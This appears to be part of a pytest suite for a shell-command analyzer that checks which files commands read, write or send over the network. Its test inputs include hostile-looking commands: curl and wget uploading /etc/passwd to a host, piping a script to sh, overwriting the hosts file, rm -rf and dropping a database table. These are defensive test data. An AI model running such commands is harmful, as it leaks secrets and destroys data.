        pytest.param("uniq - out", ["out"], False, id="uniq-stdin"),
        pytest.param("uniq -f 1 in", [], False, id="uniq-value-consumed"),
        pytest.param("uniq -w 3 --skip-chars 2 in", [], False, id="uniq-two-values"),
        pytest.param("uniq in", [], False, id="uniq-one"),
        pytest.param("xxd in out", ["out"], False, id="xxd-two"),
        pytest.param("xxd -r in out", ["out"], False, id="xxd-revert"),
        pytest.param("xxd -o 512 in", [], False, id="xxd-offset-not-output"),
        pytest.param("xxd -l 100 in", [], False, id="xxd-length"),
        pytest.param("xxd -c8 in", [], False, id="xxd-bundled-value"),
        pytest.param("yq -i '.a = 1' c.yaml", ["c.yaml"], False, id="yq-i"),
        pytest.param("yq --inplace '.a' c.yaml", ["c.yaml"], False, id="yq-inplace"),
        pytest.param("yq -iP '.a' c.yaml", ["c.yaml"], False, id="yq-i-bundled"),
        pytest.param("yq -i '.a'", [], True, id="yq-i-no-file"),
        pytest.param("yq -o json c.yaml", [], False, id="yq-output-format"),
        pytest.param("yq '.a' c.yaml", [], False, id="yq-plain"),
        pytest.param("jq --in-place '.a' f.json", ["f.json"], False, id="jq-in-place"),
        pytest.param("jq -i '.a' f.json", ["f.json"], False, id="jq-i"),
        pytest.param("jq -r '.a' f.json", [], False, id="jq-plain"),
        pytest.param("xmllint -o out.xml in.xml", ["out.xml"], False, id="xmllint-o"),
        pytest.param("xmllint --output=out.xml in.xml", ["out.xml"], False, id="xmllint-output"),
        pytest.param("xmllint --outp=out.xml in.xml", ["out.xml"], False, id="xmllint-abbreviated"),
        pytest.param("xmllint --format in.xml", [], False, id="xmllint-plain"),
        pytest.param("tree -o out", ["out"], False, id="tree-o"),
        pytest.param("tree -o", [], True, id="tree-o-with-nothing"),
    ],
)
def test_an_output_option_is_read_the_way_getopt_reads_it(
    command: str, expected_writes: list[str], unnamed: bool
) -> None:
    e = effects(command)
    (inv,) = e.invocations
    assert list(inv.writes) == expected_writes
    assert inv.unnamed_write is unnamed


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("yq '.a' c.yaml", id="yq"),
        pytest.param("xmllint --format in.xml", id="xmllint"),
        pytest.param("wget https://e/x", id="wget"),
    ],
)
def test_a_partly_known_program_reports_its_writes_and_stays_opaque(command: str) -> None:
    e = effects(command)
    assert e.opaque[0].kind == "program"
    assert e.opaque[0].reason.endswith("is a program whose reach this fence cannot read")


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        pytest.param("curl -sS -o /tmp/p https://e/x", ["/tmp/p"], id="o-detached"),
        pytest.param("curl --output=/tmp/p https://e/x", ["/tmp/p"], id="output-eq"),
        pytest.param("curl -sSo /tmp/p https://e/x", ["/tmp/p"], id="short-cluster"),
        pytest.param("curl -o a -o b https://a https://b", ["a", "b"], id="two-outputs"),
        pytest.param("curl -D /tmp/h https://e/x", ["/tmp/h"], id="dump-header"),
        pytest.param("curl -c /tmp/jar https://e/x", ["/tmp/jar"], id="cookie-jar"),
        pytest.param("curl --trace /tmp/t https://e/x", ["/tmp/t"], id="trace"),
        pytest.param("curl -sS https://e/x", [], id="stdout"),
    ],
)
def test_curls_output_options_are_writes(command: str, expected: list[str]) -> None:
    assert list(effects(command).invocations[0].writes) == expected


@pytest.mark.parametrize(
    ("command", "reads_expected"),
    [
        pytest.param("curl -d @/etc/passwd https://e/x", ["/etc/passwd"], id="data-file"),
        pytest.param("curl -d x=1 https://e/x", [], id="data-inline"),
        pytest.param("curl -F 'f=@/etc/passwd' https://e/x", ["/etc/passwd"], id="form-file"),
        pytest.param("curl -F 'f=</etc/passwd' https://e/x", ["/etc/passwd"], id="form-angle"),
        pytest.param("curl -T /etc/passwd https://e/x", ["/etc/passwd"], id="upload"),
        pytest.param("curl -K /etc/curlrc https://e/x", ["/etc/curlrc"], id="config"),
        pytest.param("curl --json @/etc/passwd https://e/x", ["/etc/passwd"], id="json"),
        pytest.param("curl file:///etc/passwd", ["/etc/passwd"], id="file-url"),
        pytest.param("curl file:/etc/passwd", ["/etc/passwd"], id="file-url-no-authority"),
        pytest.param("curl file://localhost/etc/passwd", ["/etc/passwd"], id="file-url-localhost"),
        pytest.param("curl --url file:///etc/passwd", ["/etc/passwd"], id="url-flag"),
        pytest.param("curl --url=file:///etc/passwd", ["/etc/passwd"], id="url-flag-glued"),
        pytest.param("curl -- file:///etc/passwd", ["/etc/passwd"], id="after-dashdash"),
        pytest.param("curl -H 'X: y' https://e/x", [], id="header-value-is-not-a-path"),
        pytest.param(
            "curl example.com/path", ["example.com/path"], id="bare-name-is-judged-as-a-path"
        ),
    ],
)
def test_curl_reads_the_files_it_sends_configures_itself_from_or_fetches(
    command: str, reads_expected: list[str]
) -> None:
    assert reads(effects(command)) == reads_expected


@pytest.mark.parametrize(
    ("command", "reason"),
    [
        pytest.param(
            "curl -O https://e/x", "curl -O names a destination it decides later", id="remote-name"
        ),
        pytest.param(
            "curl -Os https://e/x",
            "curl -Os names a destination it decides later",
            id="remote-name-cluster",
        ),
        pytest.param(
            "curl -OJ https://e/x",
            "curl -OJ names a destination it decides later",
            id="remote-header-name",
        ),
        pytest.param("curl -os https://e/x", "curl -os hides where it writes", id="o-not-last"),
        pytest.param("curl -o- https://e/x", "curl -o- hides where it writes", id="o-dash"),
        pytest.param("curl -o", "curl -o names no destination", id="o-with-nothing"),
        pytest.param("curl ftp://e/x", "curl ftp: is a scheme this fence cannot read", id="ftp"),
        pytest.param(
            "curl file://example.com/x",
            "curl file://example.com names a host this fence cannot read",
            id="file-host",
        ),
        pytest.param("curl -d", "curl -d names nothing", id="data-with-nothing"),
        pytest.param("cp -tv /etc a", "cp -tv hides where it writes", id="cp-t-not-last"),
        pytest.param("cp -t", "cp -t names no directory", id="cp-t-with-nothing"),
        pytest.param("cp -t /etc", "cp names nothing to put in /etc", id="cp-t-nothing-to-copy"),
        pytest.param("cp only-one", "cp names no destination", id="cp-one-operand"),
        pytest.param(
            "rsync -a ./ host:/dst",
            "rsync names a remote this fence cannot read",
            id="rsync-remote",
        ),
        pytest.param(
            "rg --pre=helper x f",
            "rg --pre=helper runs a program this fence cannot read",
            id="program-option",
        ),
        pytest.param(
            "rg --pre helper x f",
            "rg --pre runs a program this fence cannot read",
            id="program-option-detached",
        ),
        pytest.param(
            "sort --compress-program=h f",
            "sort --compress-program=h runs a program this fence cannot read",
            id="compress-program",
        ),
        pytest.param(
            "bat --pager=h f", "bat --pager=h runs a program this fence cannot read", id="pager"
        ),
        pytest.param(
            "tree --fromfile list",
            "tree --fromfile runs a program this fence cannot read",
            id="fromfile",
        ),
        pytest.param(
            "ls --exec-something=x",
            "ls --exec-something=x runs a program this fence cannot read",
            id="exec-by-name",
        ),
    ],
)
def test_a_destination_or_program_the_option_hides_is_reported(command: str, reason: str) -> None:
    e = effects(command)
    assert reason in [o.reason for o in e.opaque]


def test_a_sort_output_in_a_cluster_is_still_found_while_the_cluster_is_flagged() -> None:
    """``sort -oout`` is ``-o out`` to getopt; the old write reader refused the
    spelling. Both facts are kept: the destination is judged, and the command
    is not vouched for."""
    e = effects("sort -oout in")
    assert writes(e) == ["out"]
    assert "sort -oout hides where it writes" in [o.reason for o in e.opaque]


# --------------------------------------------------------------------------- #
# cd and the chain it builds
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        pytest.param("cd sub && cat x", [("sub", False, ()), ("x", False, ("sub",))], id="and"),
        pytest.param("cd sub; cat x", [("sub", False, ()), ("x", False, ("sub",))], id="semicolon"),
        pytest.param("cd sub\ncat x", [("sub", False, ()), ("x", False, ("sub",))], id="newline"),
        pytest.param(
            "cd a && cd .. && cat x",
            [("a", False, ()), ("..", False, ("a",)), ("x", False, ("a", ".."))],
            id="twice",
        ),
        pytest.param(
            "cd -P sub && cat x", [("sub", False, ()), ("x", False, ("sub",))], id="with-a-flag"
        ),
        pytest.param(
            "(cd sub && cat x); cat y",
            [("sub", False, ()), ("x", False, ("sub",)), ("y", False, ())],
            id="a-subshell-moves-only-inside",
        ),
    ],
)
def test_a_cd_moves_every_later_relative_name(
    command: str, expected: list[tuple[str, bool, tuple[str, ...]]]
) -> None:
    assert [(t, w, m) for t, w, m, _g in locations(effects(command))] == expected


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("cd sub | cat x", id="in-a-pipeline"),
        pytest.param("cd sub || cat x", id="or"),
        pytest.param("cd sub & cat x", id="background"),
        pytest.param("cd && cat x", id="no-operand"),
        pytest.param("cd - && cat x", id="previous-directory"),
        pytest.param("cd a b && cat x", id="two-operands"),
        pytest.param("cd $D && cat x", id="dynamic-operand"),
    ],
)
def test_a_cd_the_model_cannot_follow_is_reported_and_moves_nothing(command: str) -> None:
    e = effects(command)
    assert "a cd this fence cannot follow" in [o.reason for o in e.opaque]
    assert all(loc.moved == () for loc in e.locations)


def test_a_cd_behind_a_wrapper_moves_nothing_in_this_shell() -> None:
    e = effects("sudo cd /etc && cat x")
    assert [(t, m) for t, _w, m, _g in locations(e)] == [("/etc", ()), ("x", ())]


# --------------------------------------------------------------------------- #
# Structure
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    ("command", "reason", "inner"),
    [
        pytest.param(
            "(cd /tmp && cat x)", "a subshell this fence cannot read", ["cd", "cat"], id="subshell"
        ),
        pytest.param(
            "{ cat a; cat b; }", "a subshell this fence cannot read", ["cat", "cat"], id="group"
        ),
        pytest.param(
            "for f in *; do rm $f; done", "a loop this fence cannot read", ["rm"], id="for"
        ),
        pytest.param(
            "while read l; do cat $l; done < list",
            "a loop this fence cannot read",
            ["read", "cat"],
            id="while",
        ),
        pytest.param(
            "until false; do ls; done", "a loop this fence cannot read", ["false", "ls"], id="until"
        ),
        pytest.param(
            "select f in a b; do rm $f; done", "a loop this fence cannot read", ["rm"], id="select"
        ),
        pytest.param(
            "if [ -f x ]; then rm x; fi", "a branch this fence cannot read", ["rm"], id="if"
        ),
        pytest.param(
            "case $x in a) rm y;; esac", "a branch this fence cannot read", ["rm"], id="case"
        ),
        pytest.param(
            "f() { rm -rf x; }; f",
            "a function definition this fence cannot read",
            ["rm", "f"],
            id="function",
        ),
        pytest.param(
            "cat <(ls)",
            "a subshell this fence cannot read",
            ["cat", "ls"],
            id="process-substitution",
        ),
    ],
)
def test_a_structure_is_reported_and_its_commands_are_still_read(
    command: str, reason: str, inner: list[str]
) -> None:
    e = effects(command)
    assert reason in [o.reason for o in e.opaque]
    assert programs(e) == inner
    assert e.compound_structure is True


def test_a_negation_is_transparent_and_no_structure() -> None:
    e = effects("! rm -rf x")
    assert programs(e) == ["rm"]
    assert e.compound_structure is False


def test_find_exec_reports_both_the_brace_and_the_command_it_runs() -> None:
    e = effects("find . -exec rm {} ;")
    reasons = [o.reason for o in e.opaque]
    assert "{ is expanded by the shell" in reasons
    assert "find carries a command this fence cannot read" in reasons


@pytest.mark.parametrize(
    ("command", "structure", "statements"),
    [
        pytest.param("ls -la", False, 1, id="one"),
        pytest.param("ls; pwd", False, 2, id="two-statements"),
        pytest.param("ls | wc -l", True, 1, id="pipeline"),
        pytest.param("ls && pwd", True, 1, id="list"),
        pytest.param("echo $(whoami)", True, 1, id="substitution"),
        pytest.param("date >> log.txt", False, 1, id="a-redirect-alone-is-no-structure"),
        pytest.param("FOO=1 make", False, 1, id="assignment-prefix"),
        pytest.param("cat x # ; rm y", False, 1, id="a-comment-is-not-a-statement"),
    ],
)
def test_the_shape_of_the_command_is_reported(
    command: str, structure: bool, statements: int
) -> None:
    e = effects(command)
    assert (e.compound_structure, e.statements) == (structure, statements)


@pytest.mark.parametrize(
    ("command", "reason"),
    [
        pytest.param(
            "FOO=1 tee /etc/x", "FOO=1 is an assignment this fence cannot follow", id="prefix"
        ),
        pytest.param(
            "HOME=/etc cat ~/passwd",
            "HOME=/etc is an assignment this fence cannot follow",
            id="prefix-changing-home",
        ),
        pytest.param("FOO=1", "FOO=1 is an assignment this fence cannot follow", id="alone"),
        pytest.param(
            "export FOO=1; cat x",
            "export FOO=1 is an assignment this fence cannot follow",
            id="export",
        ),
        pytest.param(
            "declare -x FOO=1",
            "declare -x FOO=1 is an assignment this fence cannot follow",
            id="declare",
        ),
        pytest.param(
            "unset FOO; cat x", "unset FOO is an assignment this fence cannot follow", id="unset"
        ),
    ],
)
def test_an_assignment_is_reported_and_the_command_still_read(command: str, reason: str) -> None:
    e = effects(command)
    assert reason in [o.reason for o in e.opaque]


def test_an_assignment_prefix_makes_the_arguments_dynamic_and_the_command_is_still_read() -> None:
    (inv,) = effects("FOO=1 tee /etc/x").invocations
    assert inv.program == "tee" and inv.dynamic is True
    assert writes(effects("FOO=1 tee /etc/x")) == ["/etc/x"]


def test_a_command_run_inside_an_assignment_is_an_invocation() -> None:
    e = effects("a=$(psql -c 'drop table t')")
    assert programs(e) == ["psql"]
    assert e.invocations[0].argv == ("-c", "drop table t")


def test_a_double_bracket_is_a_construct_not_a_program() -> None:
    e = effects("[[ -f /etc/passwd ]]")
    assert e.invocations == ()
    assert reads(e) == ["/etc/passwd", "]"]
    assert "[[ is a program whose reach this fence cannot read" in [o.reason for o in e.opaque]


def test_a_comment_runs_nothing() -> None:
    e = effects("cat notes.md # ; cp x /etc/")
    assert programs(e) == ["cat"] and e.readable
    e = effects("cat x #c\ncp y /etc/z")
    assert programs(e) == ["cat", "cp"]
    assert writes(e) == ["/etc/z"]


@pytest.mark.parametrize(
    ("command", "piped"),
    [
        pytest.param("cat script.sh | sh", [False, True], id="tail"),
        pytest.param("cat a | tee b | wc -l", [False, True, True], id="three"),
        pytest.param("cat a |& tee b", [False, True], id="stderr-pipe"),
        pytest.param("cat a > x | wc -l", [False, True], id="redirected-head"),
    ],
)
def test_a_pipeline_member_after_the_first_reads_the_pipe(command: str, piped: list[bool]) -> None:
    assert [inv.piped for inv in effects(command).invocations] == piped


# --------------------------------------------------------------------------- #
# Network programs
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    ("command", "destinations", "dynamic"),
    [
        pytest.param("curl https://example.com", ("https://example.com",), False, id="curl"),
        pytest.param(
            "curl -X GET https://h/?d=rows",
            ("GET", "https://h/?d=rows"),
            False,
            id="curl-explicit-get",
        ),
        pytest.param('curl "$URL"', (), True, id="curl-dynamic"),
        pytest.param("curl --version", (), False, id="curl-nothing"),
        pytest.param("dig @8.8.8.8 leak.example", ("@8.8.8.8", "leak.example"), False, id="dig"),
        pytest.param("ping -c 1 localhost", ("1", "localhost"), False, id="ping"),
        pytest.param(
            "wget http://localhost:5173/index.html",
            ("http://localhost:5173/index.html",),
            False,
            id="wget",
        ),
    ],
)
def test_a_network_program_reports_where_it_was_pointed(
    command: str, destinations: tuple[str, ...], dynamic: bool
) -> None:
    (reach,) = effects(command).network
    assert reach.destinations == destinations
    assert reach.dynamic is dynamic


def test_a_program_that_is_not_a_network_program_reports_no_reach() -> None:
    assert effects("cat https://example.com").network == ()


# --------------------------------------------------------------------------- #
# Limits and fail-safety
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("cat x\x00y", id="null-byte"),
        pytest.param("\x00\x01 not a command )(", id="garbage"),
        pytest.param("echo 'unterminated > out.txt", id="unbalanced-single"),
        pytest.param('echo "unterminated > out.txt', id="unbalanced-double"),
        pytest.param("(cat x", id="unclosed-paren"),
        pytest.param("{ cat x", id="unclosed-brace"),
        pytest.param("cat x )", id="stray-close"),
        pytest.param("|", id="operator-alone"),
        pytest.param("(", id="paren-alone"),
        pytest.param(">", id="redirect-alone"),
        pytest.param("| cat x", id="pipe-first"),
        pytest.param("&& rm -rf x", id="and-first"),
        pytest.param("case", id="keyword-alone"),
        pytest.param("cat x ;; cat y", id="case-terminator-outside-a-case"),
        pytest.param("[ in.txt", id="unterminated-test"),
        pytest.param("x" * (MAX_COMMAND_BYTES + 1), id="oversize"),
    ],
)
def test_what_cannot_be_parsed_is_reported_as_such(command: str) -> None:
    e = effects(command)
    assert e.parse_error is True
    assert "parse" in kinds(e)
    assert not e.readable


def test_what_was_parsed_before_the_error_is_still_reported() -> None:
    e = effects("rm -rf x; echo 'unterminated")
    assert programs(e) == ["rm", "echo"]
    assert e.parse_error


def test_a_blank_command_runs_nothing_and_is_readable() -> None:
    for blank in ("", "   \n\t  "):
        e = effects(blank)
        assert e.invocations == () and e.locations == () and e.readable


def test_a_command_with_no_invocation_is_reported_so_nobody_vouches_for_it() -> None:
    for command in ("# just a comment", "FOO=1", "[ -f x ]"):
        e = effects(command)
        assert e.invocations == ()
        assert "the command runs nothing this fence can see" in [o.reason for o in e.opaque]


def test_deep_nesting_ends_in_a_parse_report_not_a_recursion_error() -> None:
    depth = 5000
    command = "echo " + "$(" * depth + "cat /etc/passwd" + ")" * depth
    e = effects(command)
    assert not e.readable
    assert e.parse_error or any(o.kind == "substitution" for o in e.opaque)


def test_a_long_command_is_read_whole() -> None:
    lines = [f"echo line{i} >> out{i % 7}.txt" for i in range(3000)]
    e = effects("\n".join(lines))
    assert len(e.invocations) == 3000
    assert len(e.writes) == 3000
    assert e.readable


def test_the_parser_is_safe_to_use_from_many_threads_at_once() -> None:
    """The fence judges in a worker thread while the classifier parses on the
    loop; a parser shared between them is not safe to share."""
    commands = [f"cd d{i} && cat f{i} > o{i}; sudo tee /etc/{i}" for i in range(200)]
    expected = [locations(effects(c)) for c in commands]
    results: list[list[Any] | None] = [None] * len(commands)

    def run(index: int) -> None:
        results[index] = locations(effects(commands[index]))

    with ThreadPoolExecutor(max_workers=16) as pool:
        list(pool.map(run, range(len(commands))))
        list(pool.map(run, range(len(commands))))
    assert results == expected


# --------------------------------------------------------------------------- #
# Dialect
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        pytest.param(
            r"echo pwned > C:\work\project\src\app.py",
            [r"C:\work\project\src\app.py"],
            id="redirect",
        ),
        pytest.param(r"curl -sS -o C:\work\app.py https://e/x", [r"C:\work\app.py"], id="flag"),
        pytest.param(
            r"cp payload.bin C:\Windows\System32\drivers\etc\hosts",
            [r"C:\Windows\System32\drivers\etc\hosts"],
            id="operand",
        ),
    ],
)
def test_a_windows_shell_keeps_the_separators_in_the_destination(
    command: str, expected: list[str]
) -> None:
    assert writes(analyze_shell(command, backslash_escapes=False)) == expected


def test_a_posix_shell_reads_a_backslash_as_an_escape() -> None:
    assert writes(analyze_shell("echo hi > my\\ notes.txt", backslash_escapes=True)) == [
        "my notes.txt"
    ]


def test_the_host_dialect_follows_the_host() -> None:
    assert backslash_escapes_here() is (os.name != "nt")


@pytest.mark.parametrize(
    ("command", "expected_programs", "expected_writes"),
    [
        pytest.param("\\rm -rf x", ["rm"], [], id="escaped-name"),
        pytest.param("r\\m -rf x", ["rm"], [], id="escaped-name-inner"),
        pytest.param("echo hi > my\\ notes.txt", ["echo"], ["my notes.txt"], id="escaped-space"),
        pytest.param('sh -c "sh -c \\"rm -rf x\\""', ["rm"], [], id="escaped-quote-nesting"),
    ],
)
def test_the_model_reads_the_posix_dialect_on_a_windows_host(
    monkeypatch: pytest.MonkeyPatch,
    command: str,
    expected_programs: list[str],
    expected_writes: list[str],
) -> None:
    """In bash ``\\rm`` runs ``rm`` wherever bash runs. A model that took its
    dialect from the host would hand a Windows judge ``\\rm`` and let an
    escaped name past it, so with no dialect named the reading is the POSIX one
    even where ``os.name`` is ``nt``."""
    monkeypatch.setattr(os, "name", "nt")
    assert backslash_escapes_here() is False
    e = effects(command)
    assert programs(e) == expected_programs
    assert writes(e) == expected_writes


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        pytest.param(
            "curl file://C:\\Users\\a\\auth.yml",
            ["C:\\Users\\a\\auth.yml"],
            id="drive-at-the-authority",
        ),
        pytest.param(
            "curl file:///C:/Users/a/auth.yml", ["C:/Users/a/auth.yml"], id="drive-behind-the-root"
        ),
        pytest.param(
            "curl file://localhost/C:/Users/a/auth.yml",
            ["C:/Users/a/auth.yml"],
            id="drive-behind-localhost",
        ),
    ],
)
def test_a_file_url_with_a_drive_names_the_local_file(command: str, expected: list[str]) -> None:
    assert reads(analyze_shell(command, backslash_escapes=False)) == expected


# --------------------------------------------------------------------------- #
# A word one program reads stays a read wherever the command puts it
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        pytest.param(
            "uname -a; cat /proc/version; dmesg 2>/dev/null | head -3; id; pwd",
            [("/dev/null", True), ("/proc/version", False)],
            id="the-system-survey-a-cloud-chat-ran",
        ),
        pytest.param(
            "cat /proc/version; dmesg >/dev/null",
            [("/dev/null", True), ("/proc/version", False)],
            id="stdout-to-null-in-the-next-command",
        ),
        pytest.param(
            "cat notes.md 2>&1 | head -3",
            [("notes.md", False)],
            id="a-dup-in-the-same-command",
        ),
        pytest.param(
            "cat notes.md; ls >/dev/null 2>&1",
            [("/dev/null", True), ("notes.md", False)],
            id="both-streams-to-null-after",
        ),
        pytest.param(
            "cat notes.md 2>/dev/null && wc -l notes.md",
            [("/dev/null", True), ("notes.md", False), ("notes.md", False)],
            id="stderr-to-null-on-the-reader-itself",
        ),
        pytest.param(
            "cat notes.md; echo x > out.txt",
            [("notes.md", False), ("out.txt", True)],
            id="a-real-redirect-after-is-still-a-write",
        ),
        pytest.param(
            "cat notes.md 2>/dev/null | tee out.txt",
            [("/dev/null", True), ("notes.md", False), ("out.txt", True)],
            id="tee-is-still-a-write",
        ),
        pytest.param(
            "cat /proc/version; cp notes.md out.txt",
            [("/proc/version", False), ("notes.md", False), ("out.txt", True)],
            id="cp-is-still-a-write",
        ),
        pytest.param(
            "cat notes.md && cat notes.md > out.txt",
            [("notes.md", False), ("notes.md", False), ("out.txt", True)],
            id="the-same-word-read-then-redirected-elsewhere",
        ),
    ],
)
def test_a_read_operand_is_never_taken_for_a_write_target(
    command: str, expected: list[tuple[str, bool]]
) -> None:
    """``cat FILE`` reads FILE in any sequence or pipeline. A redirect to
    ``/dev/null`` or a descriptor dup is a write of its own target (or of
    nothing) and lends that role to no other word; a real destination
    (``>``, ``tee``, ``cp``) is still a write."""
    assert sorted((loc.text, loc.writing) for loc in effects(command).locations) == expected


# --------------------------------------------------------------------------- #
# The corpus: at least as strict as both old readers on every row
# --------------------------------------------------------------------------- #

CORPUS = Path(__file__).resolve().parents[1] / "fixtures" / "shell" / "corpus.json"
ROWS: list[dict[str, Any]] = json.loads(CORPUS.read_text(encoding="utf-8"))["rows"]

#: Rows where the model reads an option the way getopt does and the old write
#: reader did not: ``sort -to`` is ``-t o``, and ``uniq -f N`` consumes ``N``.
#: The old reader wrote the file; the model reads it. Listed for the owner's
#: sign-off; the classifier's own suite pins the getopt reading.
GETOPT_LOOSENINGS: frozenset[str] = frozenset(
    {
        "permissions_bash_outputs/sort-separator-o-not-output",
        "permissions_bash_outputs/uniq-skip-fields-value",
        "permissions_bash_outputs/uniq-two-value-flags",
        "evasion/sort-to-separator",
        "evasion/uniq-value-flag",
    }
)

#: Rows the old write reader misread as writing somewhere it never wrote: a
#: here-string's operator and body taken for ``tee`` operands, a stray ``>``
#: taken for a destination. Nothing is lost; the model names the real writes.
MISREAD_TARGETS: dict[str, tuple[str, ...]] = {
    "adversarial/tee-herestring": ("<<<", "x"),
    "adversarial/arrows": (">",),
}

#: Rows the old location reader refused that the model reads whole, listed
#: for the owner's sign-off: a line continuation the old lexer could not
#: handle. What the model finds there is judged (``/etc/passwd`` is refused in
#: every stance), where the old reader could only ask.
READ_THROUGH: dict[str, str] = {
    "adversarial/line-continuation": "a backslash-newline continues the line",
}


def _acceptable_loss(row: dict[str, Any], e: ShellEffects, text: str, writing: bool) -> bool:
    """Whether a location the old readers named may be absent from the model:
    the model is opaque (so the fence refuses the whole command, a verdict at
    least as strict as any single escape); the text is a file descriptor, the
    ``-`` of ``>&-`` or an option value the old lexer took for an operand; or
    the old write reader took an unexpanded ``~`` / ``$`` spelling for a name,
    which the model expands or reports instead."""
    if not e.readable:
        return True
    if (text.isdigit() or text == "-") and not writing:
        return True
    if text.startswith("~") or "$" in text:
        # The old write reader took the unexpanded spelling for a name; the
        # model expands it (it is in ``found`` under its real name) or reports it.
        return True
    if text in MISREAD_TARGETS.get(row["id"], ()):
        return True
    return row["id"] in GETOPT_LOOSENINGS


@pytest.mark.parametrize("row", [pytest.param(row, id=row["id"]) for row in ROWS])
def test_the_model_is_at_least_as_strict_as_both_old_readers(row: dict[str, Any]) -> None:
    e = analyze_shell(row["command"], env=row["env"], backslash_escapes=row["backslash_escapes"])
    found_writes = {loc.text for loc in e.writes}
    found = {(loc.text, loc.writing) for loc in e.locations}
    write_targets = row["write_targets"]
    if isinstance(write_targets, dict):
        assert not e.readable, (
            "the write reader refused this command; the model must not vouch for it"
        )
    else:
        for target in write_targets:
            assert target in found_writes or _acceptable_loss(row, e, target, True), target
    old_locations = row["locations"]
    if isinstance(old_locations, dict):
        if row["id"] in READ_THROUGH:
            assert e.readable and e.writes, "listed as read through, but the model found nothing"
            return
        assert not e.readable, (
            "the location reader refused this command; the model must not vouch for it"
        )
        return
    for text, writing, _moved, _glob in old_locations:
        if (text, writing) in found or (not writing and (text, True) in found):
            continue
        assert _acceptable_loss(row, e, text, writing), (text, writing)


def test_every_listed_divergence_names_a_row() -> None:
    ids = {row["id"] for row in ROWS}
    for row_id in [*GETOPT_LOOSENINGS, *MISREAD_TARGETS, *READ_THROUGH]:
        assert row_id in ids, row_id


def test_the_getopt_loosenings_are_exactly_the_rows_listed() -> None:
    """Every listed row is a real loosening (the old write reader named a file
    the model reads instead), and no listed row is stale."""
    for row_id in GETOPT_LOOSENINGS:
        row = next(r for r in ROWS if r["id"] == row_id)
        e = analyze_shell(row["command"], env=row["env"])
        assert e.readable
        assert row["write_targets"] and all(t in reads(e) for t in row["write_targets"])
        assert writes(e) == []


# --------------------------------------------------------------------------- #
# Shapes found by trying to break the model
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    ("command", "program", "argv", "expected_writes"),
    [
        # tree-sitter attaches a word after ``> file`` to the redirect node; the
        # shell hands it to the command. Dropping it hid a write.
        pytest.param(
            "echo x | tee >/dev/null /etc/passwd",
            "tee",
            ("/etc/passwd",),
            ["/dev/null", "/etc/passwd"],
            id="tee-after-a-redirect",
        ),
        pytest.param(
            "sort >/dev/null -o /etc/passwd in",
            "sort",
            ("-o", "/etc/passwd", "in"),
            ["/dev/null", "/etc/passwd"],
            id="an-output-option-after-a-redirect",
        ),
        pytest.param(
            "cp >/dev/null a /etc/b",
            "cp",
            ("a", "/etc/b"),
            ["/dev/null", "/etc/b"],
            id="a-copy-after-a-redirect",
        ),
        pytest.param(
            "echo > /etc/x hi", "echo", ("hi",), ["/etc/x"], id="an-argument-after-a-redirect"
        ),
        pytest.param(
            "ls && tee > /dev/null /etc/passwd",
            "tee",
            ("/etc/passwd",),
            ["/dev/null", "/etc/passwd"],
            id="after-a-list",
        ),
    ],
)
def test_a_word_after_a_redirect_is_the_commands_argument(
    command: str, program: str, argv: tuple[str, ...], expected_writes: list[str]
) -> None:
    e = effects(command)
    inv = next(inv for inv in e.invocations if inv.program == program)
    assert inv.argv == argv
    assert writes(e) == expected_writes


def test_a_word_after_a_redirect_on_a_structure_is_reported_not_dropped() -> None:
    e = effects("(echo x) > /dev/null hi")
    assert "hi follows a redirection this fence cannot place" in [o.reason for o in e.opaque]


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("> /etc/passwd", id="alone"),
        pytest.param("echo x\r\n> /etc/passwd", id="after-a-carriage-return"),
    ],
)
def test_a_redirect_with_no_command_is_still_a_write(command: str) -> None:
    """``> file`` runs nothing and truncates the file all the same.

    The truncation is carried by a nameless invocation, so the fence judges the
    target like any other write (and refuses it off the floor) and the
    classifier, seeing no program, asks.
    """
    e = effects(command)
    assert writes(e) == ["/etc/passwd"]
    bare = e.invocations[-1]
    assert bare.program == "" and [r.target for r in bare.redirects] == ["/etc/passwd"]
    assert e.readable and e.locations[-1].writing


def test_an_empty_destination_names_nothing() -> None:
    e = effects("cat 2>&")
    assert e.locations == () and e.parse_error and not e.readable


def test_a_cd_inside_a_subshell_in_a_pipeline_is_followed_inside_it() -> None:
    e = effects("cat x | (cd /tmp && tee y)")
    assert [(t, w, m) for t, w, m, _g in locations(e)] == [
        ("x", False, ()),
        ("/tmp", False, ()),
        ("y", True, ("/tmp",)),
    ]


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("''", id="empty-string"),
        pytest.param('"" rm -rf x', id="empty-string-then-words"),
    ],
)
def test_an_empty_command_name_is_reported(command: str) -> None:
    e = effects(command)
    assert "a command with no name" in [o.reason for o in e.opaque]
    assert e.invocations[0].name == ""


def test_exec_with_an_argv0_still_runs_the_program_named_after_it() -> None:
    (inv,) = effects("exec -a fake rm -rf x").invocations
    assert inv.program == "rm"


@pytest.mark.parametrize(
    ("command", "expected_reads"),
    [
        pytest.param("wget --post-file=/etc/passwd https://e/x", ["/etc/passwd"], id="post-file"),
        pytest.param("wget -i /etc/urls https://e/x", ["/etc/urls"], id="input-file"),
        pytest.param("wget --load-cookies /etc/jar https://e/x", ["/etc/jar"], id="cookies"),
        pytest.param("wget https://e/x", [], id="plain"),
    ],
)
def test_wget_reads_the_files_it_sends_or_configures_itself_from(
    command: str, expected_reads: list[str]
) -> None:
    assert reads(effects(command)) == expected_reads
